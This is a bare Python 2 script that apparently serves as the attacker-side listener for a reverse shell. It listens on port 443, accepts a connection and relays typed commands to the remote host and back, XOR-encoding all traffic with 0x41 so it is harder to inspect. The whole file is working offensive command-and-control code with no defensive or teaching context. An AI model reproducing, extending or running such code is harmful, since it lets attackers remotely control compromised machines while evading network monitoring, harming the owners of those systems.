import socket

port = 443
s = socket.socket()
s.bind(('0.0.0.0', port))
s.listen(2)
print "[*] Listening on port " + str(port) + "..."
(client, (ip, port)) = s.accept()
print "[+] Received connection from " + ip

while True:
    command = raw_input("~$ ")
    en_command = bytearray(command)
    for i in range(len(en_command)):
        en_command[i] ^= 0x41
    client.send(en_command)

    en_data = client.recv(2048)
    data = bytearray(en_data)
    for i in range(len(data)):
        data[i] ^= 0x41
    print data

client.close()
s.close()